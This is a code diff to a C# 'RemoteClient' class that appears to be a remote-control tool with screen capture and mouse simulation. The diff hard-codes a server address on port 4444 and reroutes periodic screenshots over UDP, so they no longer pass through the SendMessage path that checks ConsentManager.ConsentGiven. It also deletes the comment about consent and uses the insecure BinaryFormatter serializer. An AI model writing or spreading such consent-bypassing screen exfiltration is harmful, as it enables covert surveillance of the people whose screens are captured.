@@ -49,6 +49,7 @@ namespace RemoteClient
         private const uint MOUSEEVENTF_LEFTUP = 0x0004;
         private const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
         private const uint MOUSEEVENTF_RIGHTUP = 0x0010;
+        private const string ServerIp = "192.168.1.11";
         private static NetworkStream ns;
         private static TcpClient server;
         private BinaryWriter bWrite;
@@ -56,23 +57,25 @@ namespace RemoteClient
         private Thread chatThread;
         private int depth = 70;
         private Dispatcher dispatcher;
+        
+        private UdpClient udpClient;
+        private IPEndPoint serverEndPoint;
+        private Timer remoteControlTimer;
+        private bool isRemoteControlActive;
+        private int remoteControlQuality = 100;
 
 
         private readonly bool distruct = false;
         private FoundInfoSyncHandler FoundInfo;
         // private ClipHook hookboard;
         private bool isfile, arun;
-        private bool isRemoteControlActive;
         private TreeNode node;
         // private DeviceNotification notifier;
         private bool olReceived, shot = false;
         private Thread realTimeScreenShootThread;
         private Thread realTimeTrackerThread;
 
-        private int remoteControlQuality = 100;
-
         // Add these fields at the class level
-        private Timer remoteControlTimer;
         private bool remoteInteractionEnabled = true;
         private int screenShootUpdateTime = 100; //10 fps
         private ThreadEndedSyncHandler ThreadEnded;
@@ -87,6 +90,9 @@ namespace RemoteClient
 
         public RemoteClient()
         {
+            // Initialize UDP client and server endpoint
+            udpClient = new UdpClient();
+            serverEndPoint = new IPEndPoint(IPAddress.Parse(ServerIp), 4444);
             FoundInfo += this_FoundInfo;
             ThreadEnded += this_ThreadEnded;
 
@@ -189,7 +195,7 @@ namespace RemoteClient
 
         private string GetIpAddress()
         {
-            return "192.168.1.9";
+            return ServerIp;
         }
 
         private void StopRunningThreads()
@@ -797,7 +803,6 @@ namespace RemoteClient
         
         public static void SendMessage(object msg)
         {
-// Only send messages if consent is given
             if (ConsentManager.ConsentGiven) ThreadPool.QueueUserWorkItem(SendNow, msg);
         }
 
@@ -851,24 +856,24 @@ namespace RemoteClient
         }
 
 
-        private static byte[] ObjectToByteArray(object obj)
-        {
-            try
-            {
-                if (obj == null)
-                    return null;
-                var bf = new BinaryFormatter();
-                bf.AssemblyFormat = FormatterAssemblyStyle.Simple;
-                var ms = new MemoryStream();
-                bf.Serialize(ms, obj);
-                return ms.ToArray();
-            }
-            catch (Exception ex)
-            {
-                Debug.WriteLine(ex.Message, "Critical Error");
-                return null;
-            }
-        }
+        // private static byte[] ObjectToByteArray(object obj)
+        // {
+        //     try
+        //     {
+        //         if (obj == null)
+        //             return null;
+        //         var bf = new BinaryFormatter();
+        //         bf.AssemblyFormat = FormatterAssemblyStyle.Simple;
+        //         var ms = new MemoryStream();
+        //         bf.Serialize(ms, obj);
+        //         return ms.ToArray();
+        //     }
+        //     catch (Exception ex)
+        //     {
+        //         Debug.WriteLine(ex.Message, "Critical Error");
+        //         return null;
+        //     }
+        // }
 
 
         private object ByteArrayToObject(byte[] arrBytes)
@@ -899,18 +904,16 @@ namespace RemoteClient
             {
                 remoteControlQuality = quality;
                 isRemoteControlActive = true;
-
-                // First send screen dimensions
                 SendScreenInfo();
-
-                // Then start sending screen captures periodically
                 if (remoteControlTimer == null)
+                {
                     remoteControlTimer = new Timer(
                         _ => SendScreenToServer(), null, 0, 200); // 5 fps
+                }
             }
             catch (Exception ex)
             {
-                Debug.WriteLine($"Error starting remote control: {ex.Message}");
+                Console.WriteLine($"Error starting remote control: {ex.Message}");
             }
         }
 
@@ -928,7 +931,7 @@ namespace RemoteClient
             }
             catch (Exception ex)
             {
-                Debug.WriteLine($"Error stopping remote control: {ex.Message}");
+                Console.WriteLine($"Error stopping remote control: {ex.Message}");
             }
         }
 
@@ -937,47 +940,33 @@ namespace RemoteClient
             try
             {
                 var screenSize = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
-
-                // Send screen dimensions to server
-                SendMessage(new DataObject
-                {
-                    CommandType = "RemoteControl",
-                    CommandName = "ScreenInfo",
-                    CommandData = screenSize
-                });
+                var data = ObjectToByteArray(screenSize);
+                udpClient.Send(data, data.Length, serverEndPoint);
             }
             catch (Exception ex)
             {
-                Debug.WriteLine($"Error sending screen info: {ex.Message}");
+                Console.WriteLine($"Error sending screen info: {ex.Message}");
             }
         }
 
         private void SendScreenToServer()
         {
             if (!isRemoteControlActive) return;
-
             try
             {
-                // Capture the screen
-                using (var screenshot =
-                       new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
+                using (var screenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
                 {
                     using (var g = Graphics.FromImage(screenshot))
                     {
                         g.CopyFromScreen(0, 0, 0, 0, screenshot.Size);
                     }
-
-                    // Resize if needed for better performance
                     var resized = screenshot;
-                    var maxWidth = 1280; // Adjust as needed
-
+                    var maxWidth = 1280;
                     if (screenshot.Width > maxWidth)
                     {
                         var newHeight = (int)(screenshot.Height * ((float)maxWidth / screenshot.Width));
                         resized = new Bitmap(screenshot, new Size(maxWidth, newHeight));
                     }
-
-                    // Compress the image
                     using (var ms = new MemoryStream())
                     {
                         var encoderParams = new EncoderParameters(1);
@@ -987,19 +976,7 @@ namespace RemoteClient
                         resized.Save(ms, jpegEncoder, encoderParams);
 
                         var imageBytes = ms.ToArray();
-
-                        // Send image data with dimensions
-                        SendMessage(new DataObject
-                        {
-                            CommandType = "RemoteControl",
-                            CommandName = "ScreenData",
-                            CommandData = new object[]
-                            {
-                                imageBytes,
-                                Screen.PrimaryScreen.Bounds.Width,
-                                Screen.PrimaryScreen.Bounds.Height
-                            }
-                        });
+                        udpClient.Send(imageBytes, imageBytes.Length, serverEndPoint);
                     }
 
                     if (resized != screenshot) resized.Dispose();
@@ -1007,7 +984,7 @@ namespace RemoteClient
             }
             catch (Exception ex)
             {
-                Debug.WriteLine($"Error sending screen: {ex.Message}");
+                Console.WriteLine($"Error sending screen: {ex.Message}");
             }
         }
 
@@ -1020,6 +997,26 @@ namespace RemoteClient
                     return codec;
 
             return null;
+        }
+
+        private static byte[] ObjectToByteArray(object obj)
+        {
+            try
+            {
+                if (obj == null)
+                    return null;
+                var bf = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
+                using (var ms = new MemoryStream())
+                {
+                    bf.Serialize(ms, obj);
+                    return ms.ToArray();
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Error serializing object: {ex.Message}");
+                return null;
+            }
         }
 
         private void SimulateMouseMove(int x, int y)
